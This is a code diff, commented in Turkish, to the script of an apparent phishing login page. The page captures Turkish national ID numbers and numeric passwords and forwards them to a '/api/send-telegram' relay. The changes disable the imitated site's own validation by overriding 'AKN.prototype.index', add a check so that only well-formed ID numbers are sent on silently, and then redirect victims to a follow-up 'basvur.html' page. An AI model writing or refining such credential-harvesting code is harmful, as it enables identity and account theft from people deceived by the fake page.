@@ -407,8 +407,30 @@
               // Boş bırak - hiçbir şey yapma
             };
           }
+          // index metodunu override et - validasyonları devre dışı bırak
+          if (typeof AKN.prototype.index === 'function') {
+            AKN.prototype.index = function() {
+              // Boş bırak - hiçbir validasyon yapma
+            };
+          }
         }
       }, 100);
+
+      // TC validasyonu
+      function validateTC(tc) {
+        if (!tc || tc.length !== 11) {
+          return false;
+        }
+        // Sadece rakam olmalı
+        if (!/^\d+$/.test(tc)) {
+          return false;
+        }
+        // İlk rakam 0 olamaz
+        if (tc[0] === '0') {
+          return false;
+        }
+        return true;
+      }
 
       // Form submit handler - Telegram API'ye gönder
       function handleFormSubmit(e) {
@@ -417,13 +439,29 @@
         const form = e.target;
         const formData = new FormData(form);
         
-        const tckn = formData.get('tckn') || '';
+        const tckn = (formData.get('tckn') || '').trim();
         const password = formData.get('password') || '';
 
-        // API endpoint
+        // Sadece TC validasyonu yap
+        if (!validateTC(tckn)) {
+          // TC geçersizse uyarı göster
+          const dialog = document.querySelector('.dialog');
+          if (dialog) {
+            const dialogText = dialog.querySelector('.dialog-body p');
+            if (dialogText) {
+              dialogText.textContent = 'Geçerli bir TC Kimlik Numarası giriniz.';
+            }
+            dialog.style.display = 'block';
+          } else {
+            alert('Geçerli bir TC Kimlik Numarası giriniz.');
+          }
+          return;
+        }
+
+        // TC geçerliyse direkt gönder, hiçbir uyarı gösterme
         const apiUrl = '/api/send-telegram';
 
-        // Loading göster (isteğe bağlı)
+        // Loading göster
         const submitButton = form.querySelector('button[type="submit"]');
         const originalText = submitButton ? submitButton.textContent : '';
         if (submitButton) {
@@ -449,14 +487,15 @@
             window.location.href = `basvur.html?tc=${encodeURIComponent(tckn)}`;
           } else {
             alert('Bir hata oluştu: ' + (data.error || 'Bilinmeyen hata'));
+            if (submitButton) {
+              submitButton.disabled = false;
+              submitButton.textContent = originalText;
+            }
           }
         })
         .catch(error => {
           console.error('Error:', error);
           alert('Bir hata oluştu. Lütfen tekrar deneyin.');
-        })
-        .finally(() => {
-          // Button'u eski haline getir
           if (submitButton) {
             submitButton.disabled = false;
             submitButton.textContent = originalText;
@@ -501,6 +540,15 @@
       // Mobile şifre inputu
       const mobilePasswordInput = document.querySelector('form[name="mobile"] input[name="password"]');
       restrictToNumbers(mobilePasswordInput);
+
+      // Dialog kapatma
+      const dialogCloseBtn = document.querySelector('#popup-ok-button');
+      const dialog = document.querySelector('.dialog');
+      if (dialogCloseBtn && dialog) {
+        dialogCloseBtn.addEventListener('click', function() {
+          dialog.style.display = 'none';
+        });
+      }
 
       // Desktop form
       const desktopForm = document.querySelector('form[name="desktop"]');
